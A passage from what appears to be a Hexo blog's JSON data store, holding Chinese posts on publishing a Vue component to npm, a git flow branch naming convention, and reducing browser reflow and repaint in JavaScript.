'package-name'时，其实导入的就是main定义的文件，它可以是CommonJs格式的, 也可以是umd格式。需要注意的是，当你把一个包发布到npm上时，它同时也可以在unpkg上获取到。也就是说，你的代码既可能在NodeJs环境也可能浏览器环境执行。为此你需要用umd格式打包，并且在package.json定义unpkg字段，一般而言此时它的命名为name.min.js</span></span><br><span class=\"line\"><span class=\"string\">\"repository\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">\"type\"</span>: <span class=\"string\">\"git\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"url\"</span>: <span class=\"string\">\"https://github.com/yokiyokiyoki/vue-fullpage.git\"</span></span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"><span class=\"string\">\"bugs\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">\"url\"</span>: <span class=\"string\">\"https://github.com/yokiyokiyoki/vue-fullpage/issues\"</span></span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"><span class=\"string\">\"keywords\"</span>: [</span><br><span class=\"line\">    <span class=\"string\">\"vue\"</span>,<span class=\"comment\">//有助于用户搜索</span></span><br><span class=\"line\">    <span class=\"string\">\"vue-component\"</span></span><br><span class=\"line\">],</span><br><span class=\"line\"><span class=\"string\">\"private\"</span>: <span class=\"literal\">false</span>,<span class=\"comment\">//false才行</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>npm publish</li>\n</ul>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://github.com/yokiyokiyoki/vue-fullpage\" target=\"_blank\" rel=\"noopener\">vue-fullpage</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"创建组件\"><a href=\"#创建组件\" class=\"headerlink\" title=\"创建组件\"></a>创建组件</h2><ul>\n<li>通过 vue-cli 3 来创建一个组件</li>\n</ul>\n<h4 id=\"为什么通过-vue-cli3\"><a href=\"#为什么通过-vue-cli3\" class=\"headerlink\" title=\"为什么通过 vue-cli3\"></a>为什么通过 vue-cli3</h4><ul>\n<li>该脚手架允许构建不同的目标，包括应用，库</li>\n</ul>\n<h2 id=\"修改-src-目录文件如下\"><a href=\"#修改-src-目录文件如下\" class=\"headerlink\" title=\"修改 src 目录文件如下\"></a>修改 src 目录文件如下</h2><ul>\n<li>src<ul>\n<li>index.js(插件入口)</li>\n<li>fullpage.vue（组件）</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"修改-package-json-的-script\"><a href=\"#修改-package-json-的-script\" class=\"headerlink\" title=\"修改 package.json 的 script\"></a>修改 package.json 的 script</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"scripts\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">\"serve\"</span>: <span class=\"string\">\"vue-cli-service serve\"</span>,</span><br><span class=\"line\">    <span class=\"comment\">// build lib</span></span><br><span class=\"line\">    <span class=\"string\">\"build:lib\"</span>: <span class=\"string\">\"vue-cli-service build --target lib --name v-fullpage ./src/index.js\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"lint\"</span>: <span class=\"string\">\"vue-cli-service lint\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"打包生成第三方库\"><a href=\"#打包生成第三方库\" class=\"headerlink\" title=\"打包生成第三方库\"></a>打包生成第三方库</h2><ul>\n<li>yarn build:lib</li>\n<li>根目录下就会出现 dist 文件夹，包含不同版本的 .js 文件，而 v-fullpage.umd.min.js 文件就是给到用户使用的第三方库了</li>\n</ul>\n<h2 id=\"上传-npm\"><a href=\"#上传-npm\" class=\"headerlink\" title=\"上传 npm\"></a>上传 npm</h2><ul>\n<li>npm login</li>\n<li>package.json</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"name\"</span>: <span class=\"string\">\"v-fullpage\"</span>, <span class=\"comment\">// 包名,上传名字前到npm查看是否有同名</span></span><br><span class=\"line\"><span class=\"string\">\"description\"</span>: <span class=\"string\">\"A Vue.js components\"</span>,<span class=\"comment\">//对包的描述，在npmjs.com上搜索时会显示，有助于用户在搜索时进行筛选</span></span><br><span class=\"line\"><span class=\"string\">\"version\"</span>: <span class=\"string\">\"0.2.0\"</span>, <span class=\"comment\">// 每次发布需比上一个版本高,不然不给你发布的</span></span><br><span class=\"line\"><span class=\"string\">\"author\"</span>: <span class=\"string\">\"youjie &lt;419703726@qq.com&gt;\"</span>,</span><br><span class=\"line\"><span class=\"string\">\"private\"</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">\"main\"</span>: <span class=\"string\">\"dist/v-fullpage.umd.min.js\"</span>, <span class=\"comment\">// 入口,import pkg from 'package-name'时，其实导入的就是main定义的文件，它可以是CommonJs格式的, 也可以是umd格式。需要注意的是，当你把一个包发布到npm上时，它同时也可以在unpkg上获取到。也就是说，你的代码既可能在NodeJs环境也可能浏览器环境执行。为此你需要用umd格式打包，并且在package.json定义unpkg字段，一般而言此时它的命名为name.min.js</span></span><br><span class=\"line\"><span class=\"string\">\"repository\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">\"type\"</span>: <span class=\"string\">\"git\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"url\"</span>: <span class=\"string\">\"https://github.com/yokiyokiyoki/vue-fullpage.git\"</span></span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"><span class=\"string\">\"bugs\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"string\">\"url\"</span>: <span class=\"string\">\"https://github.com/yokiyokiyoki/vue-fullpage/issues\"</span></span><br><span class=\"line\">&#125;,</span><br><span class=\"line\"><span class=\"string\">\"keywords\"</span>: [</span><br><span class=\"line\">    <span class=\"string\">\"vue\"</span>,<span class=\"comment\">//有助于用户搜索</span></span><br><span class=\"line\">    <span class=\"string\">\"vue-component\"</span></span><br><span class=\"line\">],</span><br><span class=\"line\"><span class=\"string\">\"private\"</span>: <span class=\"literal\">false</span>,<span class=\"comment\">//false才行</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>npm publish</li>\n</ul>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://github.com/yokiyokiyoki/vue-fullpage\" target=\"_blank\" rel=\"noopener\">vue-fullpage</a></li>\n</ul>\n"},{"title":"分支规范说明（git flow）","date":"2019-01-06T14:36:24.000Z","_content":"\n# 背景\n\n- 由于 git 项目到后期可能会有太多分支（小伙伴忘记删除），且小伙伴不知道哪个分支是有用的\n- 线上紧急 bug 修复不应直接修改 master 代码\n\ngit branch 功能很强大，但是没有一套模型告诉我们应该怎样在开发的时候善用这些分支。而 Git Flow 模型就是要告诉我们怎么更好地使用 Git 分支。Git Flow 模型也有相关的插件，可放心食用。\n\n# 产品迭代周期\n\n> 可以明确的是，产品开发迭代必须是有一个周期的。这个周期时间，可以由 pm（项目或者产品）指定，不论多短或多长，都应视为一个周期。此概念可帮助该 git-flow 模型执行。\n\n- 周期时间确立之初，需要把周期结束完结的所有 feature 和 bugfix 确定好（feature 和 bug 都视为一个周期内之需求）\n- 该周期一旦开始，便不能随便插队新功能 feature。新功能应当放入需求池，延续到下一次迭代周期（该项需要和每个 pm 确认，让其知悉）\n- 周期完成后，master 需要打 tag 并发布线上（方便回滚上一个稳定版本），并记录 release note，可追溯\n- 产品版本，如果没有的请开始 push 大家用起来吧\n\n# 分支说明\n\nMaster 以及 Develop 这两个分支是长期分支，他们会一直存活在整个 Git Flow 里，而其它的分支大多会因任务结束(执行 finish 命令)而被自动删除，这样无需担心有冗余分支。\n\nRelease 是需要打版本号的分支。例如 1.1.2（待定）。\n\n除上述三种分支，其他分支命名规范统一以：功能分支-年/月/日：feature/180827。\n\n倘若有 jira 链接，假设是 radar（该项目）109，可以附上：feature/180827-radar109\n\n### Master 分支\n\n- 该分支永远是线上稳定可信赖版本\n  - 产品经理说线上有问题的时候只能从这个分支切出来 hotfix 分支做热修复\n  - 可以在该分支打 Tag\n- 任何人不允许在该分支直接修改并提交代码\n  - 只能从别的分支合并到 master\n\n### Develop 分支\n\n- 是所有 feature 的基础分支\n  - 产品经理说开发新功能的时候，基于该分支开始切出新的 feature 分支，而最后所有 feature 分支功能完成后，也会合并回 develop 分支\n\n### Release 分支\n\n- 上线前的分支\n  - rc1，rc2→master\n- 不允许在该分支上开发新功能\n  - 通过询问产品经理，可得知一个周期内的 develop（集齐许多 feature），准备上线了，可以进行 release 发布\n  - 若产品经理需要临时上线新功能可以拒绝\n  - 可以进行一些 bugfix\n- 为什么不用 develop 作为 release 分支\n  - 在发布周期内，还可以在 develop 开发新功能\n  - 一个团队可以忙于发布，另一个团队可以忙于开发下一个周期的新功能\n- 需要写 release note\n  - 在相关 wiki 上记录版本发布内容\n\n### Hotfix 分支\n\n- 线上出现故障的时候，紧急修复的分支\n  - 产品经理说线上某个问题必须修一下，那么从 Master 分支开一个 Hotfix 分支出來进行修复，Hotfix 分支修复完成之后，会合并回 Master 分支，也同时会合并一份到 Develop 分支。\n\n### Bugfix 分支\n\n- 线上出现故障的时候，但是并不需要立刻修复\n- 新功能开发完毕，合到 develop 分支之后发现有 bug\n\n### Feature 分支\n\n- 功能分支\n  - 从 develop 来，最终完成后会合并回 develop\n","source":"_posts/git-branch.md","raw":"---\ntitle: 分支规范说明（git flow）\ndate: 2019-01-06 22:36:24\ntags: git\n---\n\n# 背景\n\n- 由于 git 项目到后期可能会有太多分支（小伙伴忘记删除），且小伙伴不知道哪个分支是有用的\n- 线上紧急 bug 修复不应直接修改 master 代码\n\ngit branch 功能很强大，但是没有一套模型告诉我们应该怎样在开发的时候善用这些分支。而 Git Flow 模型就是要告诉我们怎么更好地使用 Git 分支。Git Flow 模型也有相关的插件，可放心食用。\n\n# 产品迭代周期\n\n> 可以明确的是，产品开发迭代必须是有一个周期的。这个周期时间，可以由 pm（项目或者产品）指定，不论多短或多长，都应视为一个周期。此概念可帮助该 git-flow 模型执行。\n\n- 周期时间确立之初，需要把周期结束完结的所有 feature 和 bugfix 确定好（feature 和 bug 都视为一个周期内之需求）\n- 该周期一旦开始，便不能随便插队新功能 feature。新功能应当放入需求池，延续到下一次迭代周期（该项需要和每个 pm 确认，让其知悉）\n- 周期完成后，master 需要打 tag 并发布线上（方便回滚上一个稳定版本），并记录 release note，可追溯\n- 产品版本，如果没有的请开始 push 大家用起来吧\n\n# 分支说明\n\nMaster 以及 Develop 这两个分支是长期分支，他们会一直存活在整个 Git Flow 里，而其它的分支大多会因任务结束(执行 finish 命令)而被自动删除，这样无需担心有冗余分支。\n\nRelease 是需要打版本号的分支。例如 1.1.2（待定）。\n\n除上述三种分支，其他分支命名规范统一以：功能分支-年/月/日：feature/180827。\n\n倘若有 jira 链接，假设是 radar（该项目）109，可以附上：feature/180827-radar109\n\n### Master 分支\n\n- 该分支永远是线上稳定可信赖版本\n  - 产品经理说线上有问题的时候只能从这个分支切出来 hotfix 分支做热修复\n  - 可以在该分支打 Tag\n- 任何人不允许在该分支直接修改并提交代码\n  - 只能从别的分支合并到 master\n\n### Develop 分支\n\n- 是所有 feature 的基础分支\n  - 产品经理说开发新功能的时候，基于该分支开始切出新的 feature 分支，而最后所有 feature 分支功能完成后，也会合并回 develop 分支\n\n### Release 分支\n\n- 上线前的分支\n  - rc1，rc2→master\n- 不允许在该分支上开发新功能\n  - 通过询问产品经理，可得知一个周期内的 develop（集齐许多 feature），准备上线了，可以进行 release 发布\n  - 若产品经理需要临时上线新功能可以拒绝\n  - 可以进行一些 bugfix\n- 为什么不用 develop 作为 release 分支\n  - 在发布周期内，还可以在 develop 开发新功能\n  - 一个团队可以忙于发布，另一个团队可以忙于开发下一个周期的新功能\n- 需要写 release note\n  - 在相关 wiki 上记录版本发布内容\n\n### Hotfix 分支\n\n- 线上出现故障的时候，紧急修复的分支\n  - 产品经理说线上某个问题必须修一下，那么从 Master 分支开一个 Hotfix 分支出來进行修复，Hotfix 分支修复完成之后，会合并回 Master 分支，也同时会合并一份到 Develop 分支。\n\n### Bugfix 分支\n\n- 线上出现故障的时候，但是并不需要立刻修复\n- 新功能开发完毕，合到 develop 分支之后发现有 bug\n\n### Feature 分支\n\n- 功能分支\n  - 从 develop 来，最终完成后会合并回 develop\n","slug":"git-branch","published":1,"updated":"2019-02-26T14:51:48.485Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034k2000w0iof15b4xvs6","content":"<h1 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h1><ul>\n<li>由于 git 项目到后期可能会有太多分支（小伙伴忘记删除），且小伙伴不知道哪个分支是有用的</li>\n<li>线上紧急 bug 修复不应直接修改 master 代码</li>\n</ul>\n<p>git branch 功能很强大，但是没有一套模型告诉我们应该怎样在开发的时候善用这些分支。而 Git Flow 模型就是要告诉我们怎么更好地使用 Git 分支。Git Flow 模型也有相关的插件，可放心食用。</p>\n<h1 id=\"产品迭代周期\"><a href=\"#产品迭代周期\" class=\"headerlink\" title=\"产品迭代周期\"></a>产品迭代周期</h1><blockquote>\n<p>可以明确的是，产品开发迭代必须是有一个周期的。这个周期时间，可以由 pm（项目或者产品）指定，不论多短或多长，都应视为一个周期。此概念可帮助该 git-flow 模型执行。</p>\n</blockquote>\n<ul>\n<li>周期时间确立之初，需要把周期结束完结的所有 feature 和 bugfix 确定好（feature 和 bug 都视为一个周期内之需求）</li>\n<li>该周期一旦开始，便不能随便插队新功能 feature。新功能应当放入需求池，延续到下一次迭代周期（该项需要和每个 pm 确认，让其知悉）</li>\n<li>周期完成后，master 需要打 tag 并发布线上（方便回滚上一个稳定版本），并记录 release note，可追溯</li>\n<li>产品版本，如果没有的请开始 push 大家用起来吧</li>\n</ul>\n<h1 id=\"分支说明\"><a href=\"#分支说明\" class=\"headerlink\" title=\"分支说明\"></a>分支说明</h1><p>Master 以及 Develop 这两个分支是长期分支，他们会一直存活在整个 Git Flow 里，而其它的分支大多会因任务结束(执行 finish 命令)而被自动删除，这样无需担心有冗余分支。</p>\n<p>Release 是需要打版本号的分支。例如 1.1.2（待定）。</p>\n<p>除上述三种分支，其他分支命名规范统一以：功能分支-年/月/日：feature/180827。</p>\n<p>倘若有 jira 链接，假设是 radar（该项目）109，可以附上：feature/180827-radar109</p>\n<h3 id=\"Master-分支\"><a href=\"#Master-分支\" class=\"headerlink\" title=\"Master 分支\"></a>Master 分支</h3><ul>\n<li>该分支永远是线上稳定可信赖版本<ul>\n<li>产品经理说线上有问题的时候只能从这个分支切出来 hotfix 分支做热修复</li>\n<li>可以在该分支打 Tag</li>\n</ul>\n</li>\n<li>任何人不允许在该分支直接修改并提交代码<ul>\n<li>只能从别的分支合并到 master</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Develop-分支\"><a href=\"#Develop-分支\" class=\"headerlink\" title=\"Develop 分支\"></a>Develop 分支</h3><ul>\n<li>是所有 feature 的基础分支<ul>\n<li>产品经理说开发新功能的时候，基于该分支开始切出新的 feature 分支，而最后所有 feature 分支功能完成后，也会合并回 develop 分支</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Release-分支\"><a href=\"#Release-分支\" class=\"headerlink\" title=\"Release 分支\"></a>Release 分支</h3><ul>\n<li>上线前的分支<ul>\n<li>rc1，rc2→master</li>\n</ul>\n</li>\n<li>不允许在该分支上开发新功能<ul>\n<li>通过询问产品经理，可得知一个周期内的 develop（集齐许多 feature），准备上线了，可以进行 release 发布</li>\n<li>若产品经理需要临时上线新功能可以拒绝</li>\n<li>可以进行一些 bugfix</li>\n</ul>\n</li>\n<li>为什么不用 develop 作为 release 分支<ul>\n<li>在发布周期内，还可以在 develop 开发新功能</li>\n<li>一个团队可以忙于发布，另一个团队可以忙于开发下一个周期的新功能</li>\n</ul>\n</li>\n<li>需要写 release note<ul>\n<li>在相关 wiki 上记录版本发布内容</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Hotfix-分支\"><a href=\"#Hotfix-分支\" class=\"headerlink\" title=\"Hotfix 分支\"></a>Hotfix 分支</h3><ul>\n<li>线上出现故障的时候，紧急修复的分支<ul>\n<li>产品经理说线上某个问题必须修一下，那么从 Master 分支开一个 Hotfix 分支出來进行修复，Hotfix 分支修复完成之后，会合并回 Master 分支，也同时会合并一份到 Develop 分支。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Bugfix-分支\"><a href=\"#Bugfix-分支\" class=\"headerlink\" title=\"Bugfix 分支\"></a>Bugfix 分支</h3><ul>\n<li>线上出现故障的时候，但是并不需要立刻修复</li>\n<li>新功能开发完毕，合到 develop 分支之后发现有 bug</li>\n</ul>\n<h3 id=\"Feature-分支\"><a href=\"#Feature-分支\" class=\"headerlink\" title=\"Feature 分支\"></a>Feature 分支</h3><ul>\n<li>功能分支<ul>\n<li>从 develop 来，最终完成后会合并回 develop</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h1><ul>\n<li>由于 git 项目到后期可能会有太多分支（小伙伴忘记删除），且小伙伴不知道哪个分支是有用的</li>\n<li>线上紧急 bug 修复不应直接修改 master 代码</li>\n</ul>\n<p>git branch 功能很强大，但是没有一套模型告诉我们应该怎样在开发的时候善用这些分支。而 Git Flow 模型就是要告诉我们怎么更好地使用 Git 分支。Git Flow 模型也有相关的插件，可放心食用。</p>\n<h1 id=\"产品迭代周期\"><a href=\"#产品迭代周期\" class=\"headerlink\" title=\"产品迭代周期\"></a>产品迭代周期</h1><blockquote>\n<p>可以明确的是，产品开发迭代必须是有一个周期的。这个周期时间，可以由 pm（项目或者产品）指定，不论多短或多长，都应视为一个周期。此概念可帮助该 git-flow 模型执行。</p>\n</blockquote>\n<ul>\n<li>周期时间确立之初，需要把周期结束完结的所有 feature 和 bugfix 确定好（feature 和 bug 都视为一个周期内之需求）</li>\n<li>该周期一旦开始，便不能随便插队新功能 feature。新功能应当放入需求池，延续到下一次迭代周期（该项需要和每个 pm 确认，让其知悉）</li>\n<li>周期完成后，master 需要打 tag 并发布线上（方便回滚上一个稳定版本），并记录 release note，可追溯</li>\n<li>产品版本，如果没有的请开始 push 大家用起来吧</li>\n</ul>\n<h1 id=\"分支说明\"><a href=\"#分支说明\" class=\"headerlink\" title=\"分支说明\"></a>分支说明</h1><p>Master 以及 Develop 这两个分支是长期分支，他们会一直存活在整个 Git Flow 里，而其它的分支大多会因任务结束(执行 finish 命令)而被自动删除，这样无需担心有冗余分支。</p>\n<p>Release 是需要打版本号的分支。例如 1.1.2（待定）。</p>\n<p>除上述三种分支，其他分支命名规范统一以：功能分支-年/月/日：feature/180827。</p>\n<p>倘若有 jira 链接，假设是 radar（该项目）109，可以附上：feature/180827-radar109</p>\n<h3 id=\"Master-分支\"><a href=\"#Master-分支\" class=\"headerlink\" title=\"Master 分支\"></a>Master 分支</h3><ul>\n<li>该分支永远是线上稳定可信赖版本<ul>\n<li>产品经理说线上有问题的时候只能从这个分支切出来 hotfix 分支做热修复</li>\n<li>可以在该分支打 Tag</li>\n</ul>\n</li>\n<li>任何人不允许在该分支直接修改并提交代码<ul>\n<li>只能从别的分支合并到 master</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Develop-分支\"><a href=\"#Develop-分支\" class=\"headerlink\" title=\"Develop 分支\"></a>Develop 分支</h3><ul>\n<li>是所有 feature 的基础分支<ul>\n<li>产品经理说开发新功能的时候，基于该分支开始切出新的 feature 分支，而最后所有 feature 分支功能完成后，也会合并回 develop 分支</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Release-分支\"><a href=\"#Release-分支\" class=\"headerlink\" title=\"Release 分支\"></a>Release 分支</h3><ul>\n<li>上线前的分支<ul>\n<li>rc1，rc2→master</li>\n</ul>\n</li>\n<li>不允许在该分支上开发新功能<ul>\n<li>通过询问产品经理，可得知一个周期内的 develop（集齐许多 feature），准备上线了，可以进行 release 发布</li>\n<li>若产品经理需要临时上线新功能可以拒绝</li>\n<li>可以进行一些 bugfix</li>\n</ul>\n</li>\n<li>为什么不用 develop 作为 release 分支<ul>\n<li>在发布周期内，还可以在 develop 开发新功能</li>\n<li>一个团队可以忙于发布，另一个团队可以忙于开发下一个周期的新功能</li>\n</ul>\n</li>\n<li>需要写 release note<ul>\n<li>在相关 wiki 上记录版本发布内容</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Hotfix-分支\"><a href=\"#Hotfix-分支\" class=\"headerlink\" title=\"Hotfix 分支\"></a>Hotfix 分支</h3><ul>\n<li>线上出现故障的时候，紧急修复的分支<ul>\n<li>产品经理说线上某个问题必须修一下，那么从 Master 分支开一个 Hotfix 分支出來进行修复，Hotfix 分支修复完成之后，会合并回 Master 分支，也同时会合并一份到 Develop 分支。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Bugfix-分支\"><a href=\"#Bugfix-分支\" class=\"headerlink\" title=\"Bugfix 分支\"></a>Bugfix 分支</h3><ul>\n<li>线上出现故障的时候，但是并不需要立刻修复</li>\n<li>新功能开发完毕，合到 develop 分支之后发现有 bug</li>\n</ul>\n<h3 id=\"Feature-分支\"><a href=\"#Feature-分支\" class=\"headerlink\" title=\"Feature 分支\"></a>Feature 分支</h3><ul>\n<li>功能分支<ul>\n<li>从 develop 来，最终完成后会合并回 develop</li>\n</ul>\n</li>\n</ul>\n"},{"title":"浅谈重排和重绘","date":"2018-04-10T11:37:30.000Z","_content":"\n## 简单介绍\n\n* 网页生成布局(重排 reflow)，页面绘制（重绘 repaint）一个个盒子元素\n  > 重排一定会引起重绘，重绘不一定引起重排\n\n- 为什么这样说，如果我改变了布局，比如改变边框宽度或者给段落增加文字，浏览器需要重新计算元素的几何属性，就会重排，然后就会重新绘制\n- 但是如果改变元素的背景色，就只会发生重绘，而不会影响布局\n- 重绘和重排非常消耗资源，应该尽量避免\n\n## 怎样优化\n\n### 批量读或者批量写\n\n> 现代浏览器已经很智能，会把所有变动排在一起，然后一次性集中在一起，推入到一个队列然后再渲染，这样通过队列话修改然后批量执行可以优化重排过程。\n\n```javascript\ndiv.stryle.color = \"red\";\ndiv.style.marginTop = \"30px\";\n//这里不会是一次次变，而是只会触发一次重排和重绘\n\n//但是下面这样，就会触发两次重排和重绘\ndiv.style.color = \"blue\";\nvar margin = parseInt(div.style.marginTop);\ndiv.style.marginTop = margin + 10 + \"px\";\n//第二行中，我们读取该div的元素位置，这个时候浏览器这个队列马上就要推出去渲染，才可以得知新的布局的位置，所以浏览器必须要重排\n```\n\n* 由上可知，如果我们在写操作之后，再读会立即渲染，有以下读操作\n\n```javascript\noffsetTop / offsetLeft / offsetWidth / offsetHeight;\nscrollTop / scrollLeft / scrollWidth / scrollHeight;\nclientTop / clientLeft / clientWidth / clientHeight;\ngetComputedStyle();\n```\n\n* 所以我们要懂得批量读和批量写\n\n```javascript\n// bad\ndiv.style.left = div.offsetLeft + 10 + \"px\";\ndiv.style.top = div.offsetTop + 10 + \"px\";\n\n// good\nvar left = div.offsetLeft;\nvar top = div.offsetTop;\ndiv.style.left = left + 10 + \"px\";\ndiv.style.top = top + 10 + \"px\";\n```\n\n### 合并样式操作\n\n> 尽管现代浏览器做了优化，但是旧的浏览器可能没有，所以我们应该尽可能合并对样式的修改\n\n* cssText：el.style.cssText='border-left: 1px; border-right: 2px; padding: 5px;'\n* 修改 className：如果不是那么依赖计算，可以通过修改 className\n\n### 修改 dom 元素的时候使其脱离文档流\n\n> 当我们需要对 dom 元素频繁操作的时候，我们可以这样减少重排和重绘\n\n* 让该 dom 元素脱离文档流（重排）\n* 操作元素\n* 完成后再添加到 document（重排）\n\n#### 如何脱离文档流\n\n* 隐藏元素：display:none，然后一系列操作后，再显示\n* 推荐：使用 document fragment，就是传说中的文档碎片了，document.createDocumentFragment()，另外的 dom 子树，操作完后，再拷贝回来文档中，div.appendChild（fragment）\n* 将原始元素拷贝到一个脱离文档的节点中，cloneNode,修改这个副本，然后再通过这个元素的父元素的 replaceChild 替换他\n\n```javascript\nlet old = document.getElementById(\"mylist\");\nlet clone = old.cloneNode(true);\nappendDataToElement(clone, data);\nold.parentNode.replaceChild(clone, old);\n```\n\n### 缓存读过的样式结果\n\n* div.style.top 读取可能会重排，这样最好这个缓存到变量里面，下次要用到这个就不用再读 div 的信息了\n\n### 定位脱离文档流\n\n* 可以将要多次重排的元素，position 可以设置 abs 和 fixed，这样就脱离文档流，不会影响其他元素。\n* 有动画效果的可以设置为绝对定位\n\n### 使用 window.requestAnimationFrame()、window.requestIdleCallback() 重新渲染\n","source":"_posts/repaint.md","raw":"---\ntitle: 浅谈重排和重绘\ndate: 2018-04-10 19:37:30\ntags: 浏览器\n---\n\n## 简单介绍\n\n* 网页生成布局(重排 reflow)，页面绘制（重绘 repaint）一个个盒子元素\n  > 重排一定会引起重绘，重绘不一定引起重排\n\n- 为什么这样说，如果我改变了布局，比如改变边框宽度或者给段落增加文字，浏览器需要重新计算元素的几何属性，就会重排，然后就会重新绘制\n- 但是如果改变元素的背景色，就只会发生重绘，而不会影响布局\n- 重绘和重排非常消耗资源，应该尽量避免\n\n## 怎样优化\n\n### 批量读或者批量写\n\n> 现代浏览器已经很智能，会把所有变动排在一起，然后一次性集中在一起，推入到一个队列然后再渲染，这样通过队列话修改然后批量执行可以优化重排过程。\n\n```javascript\ndiv.stryle.color = \"red\";\ndiv.style.marginTop = \"30px\";\n//这里不会是一次次变，而是只会触发一次重排和重绘\n\n//但是下面这样，就会触发两次重排和重绘\ndiv.style.color = \"blue\";\nvar margin = parseInt(div.style.marginTop);\ndiv.style.marginTop = margin + 10 + \"px\";\n//第二行中，我们读取该div的元素位置，这个时候浏览器这个队列马上就要推出去渲染，才可以得知新的布局的位置，所以浏览器必须要重排\n```\n\n* 由上可知，如果我们在写操作之后，再读会立即渲染，有以下读操作\n\n```javascript\noffsetTop / offsetLeft / offsetWidth / offsetHeight;\nscrollTop / scrollLeft / scrollWidth / scrollHeight;\nclientTop / clientLeft / clientWidth / clientHeight;\ngetComputedStyle();\n```\n\n* 所以我们要懂得批量读和批量写\n\n```javascript\n// bad\ndiv.style.left = div.offsetLeft + 10 + \"px\";\ndiv.style.top = div.offsetTop + 10 + \"px\";\n\n// good\nvar left = div.offsetLeft;\nvar top = div.offsetTop;\ndiv.style.left = left + 10 + \"px\";\ndiv.style.top = top + 10 + \"px\";\n```\n\n### 合并样式操作\n\n> 尽管现代浏览器做了优化，但是旧的浏览器可能没有，所以我们应该尽可能合并对样式的修改\n\n* cssText：el.style.cssText='border-left: 1px; border-right: 2px; padding: 5px;'\n* 修改 className：如果不是那么依赖计算，可以通过修改 className\n\n### 修改 dom 元素的时候使其脱离文档流\n\n> 当我们需要对 dom 元素频繁操作的时候，我们可以这样减少重排和重绘\n\n* 让该 dom 元素脱离文档流（重排）\n* 操作元素\n* 完成后再添加到 document（重排）\n\n#### 如何脱离文档流\n\n* 隐藏元素：display:none，然后一系列操作后，再显示\n* 推荐：使用 document fragment，就是传说中的文档碎片了，document.createDocumentFragment()，另外的 dom 子树，操作完后，再拷贝回来文档中，div.appendChild（fragment）\n* 将原始元素拷贝到一个脱离文档的节点中，cloneNode,修改这个副本，然后再通过这个元素的父元素的 replaceChild 替换他\n\n```javascript\nlet old = document.getElementById(\"mylist\");\nlet clone = old.cloneNode(true);\nappendDataToElement(clone, data);\nold.parentNode.replaceChild(clone, old);\n```\n\n### 缓存读过的样式结果\n\n* div.style.top 读取可能会重排，这样最好这个缓存到变量里面，下次要用到这个就不用再读 div 的信息了\n\n### 定位脱离文档流\n\n* 可以将要多次重排的元素，position 可以设置 abs 和 fixed，这样就脱离文档流，不会影响其他元素。\n* 有动画效果的可以设置为绝对定位\n\n### 使用 window.requestAnimationFrame()、window.requestIdleCallback() 重新渲染\n","slug":"repaint","published":1,"updated":"2018-04-18T03:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034k3000x0iof5okaoozb","content":"<h2 id=\"简单介绍\"><a href=\"#简单介绍\" class=\"headerlink\" title=\"简单介绍\"></a>简单介绍</h2><ul>\n<li>网页生成布局(重排 reflow)，页面绘制（重绘 repaint）一个个盒子元素<blockquote>\n<p>重排一定会引起重绘，重绘不一定引起重排</p>\n</blockquote>\n</li>\n</ul>\n<ul>\n<li>为什么这样说，如果我改变了布局，比如改变边框宽度或者给段落增加文字，浏览器需要重新计算元素的几何属性，就会重排，然后就会重新绘制</li>\n<li>但是如果改变元素的背景色，就只会发生重绘，而不会影响布局</li>\n<li>重绘和重排非常消耗资源，应该尽量避免</li>\n</ul>\n<h2 id=\"怎样优化\"><a href=\"#怎样优化\" class=\"headerlink\" title=\"怎样优化\"></a>怎样优化</h2><h3 id=\"批量读或者批量写\"><a href=\"#批量读或者批量写\" class=\"headerlink\" 